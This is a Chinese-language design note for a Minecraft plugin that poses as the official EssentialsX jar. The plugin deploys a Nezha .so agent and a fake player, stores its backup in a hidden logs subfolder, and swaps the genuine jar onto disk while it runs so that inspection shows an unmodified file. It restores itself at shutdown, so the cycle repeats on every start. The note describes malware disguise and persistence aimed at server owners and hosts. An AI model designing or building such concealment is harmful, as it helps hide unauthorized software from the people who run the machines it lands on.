# JAR 替换还原（按 ceshia 方式移植）

时序（按需求固定）：服务器启动完成（插件 onEnable）→ 等待 **14 秒** → 部署哪吒 .so → 启动内置假人 → 替换生效。

## 替换（启用后，仅执行一次）

1. 在 plugins 目录找到名字含 `essentialsx` 的 JAR（即本插件，文件名 `EssentialsX-2.21.2.jar` 与官方发布包同名）。
2. 备份到 `logs/.mcchajian/.runtime/backup/<原文件名>.bak`；备份已存在时不覆盖（ceshia 原始语义，备份即循环里"原来的插件"）。
3. 下载官方 `EssentialsX-2.21.2.jar` 到 plugins 目录内的 `temp_update.jar`：先走镜像 `mirror.ghproxy.com`（20 秒超时），失败或小于 1MB 再直连 GitHub（30 秒超时）；接受条件与 ceshia 一致——下载成功且大于 1MB。
4. 用原子重命名（不支持时普通覆盖）把官方包覆盖到 plugins 目录。运行中的 JVM 仍持有原 JAR 的文件句柄，插件继续正常工作；磁盘上看到的是未经修改的正版 JAR。

下载失败时不清空备份、不动已安装的 JAR，只留下警告；下次启动重新尝试。

## 还原（禁用时，最先执行）

onDisable 第一件事就是把备份拷回 plugins 目录（先删掉目录里的官方包再覆盖还原），之后才停假人、停哪吒。下次启动服务器加载的又是本插件，重复以上替换，形成循环。

## 边界

- 进程被 `kill -9` 或断电时 onDisable 不会运行，plugins 目录会留在官方包上，下次启动加载的是官方 EssentialsX（无害，但本插件不再运行，循环中断）；正常 `/stop`、`/reload`、面板重启都会走还原。
- 要升级本插件：先删掉 `logs/.mcchajian/.runtime/backup/*.bak` 再停服替换 JAR，否则停服还原会把旧版拷回来（备份即循环锚点的副作用）。
- 替换不做 SHA-256 校验（与 ceshia 一致），以文件大小（>1MB）做最基本防呆。
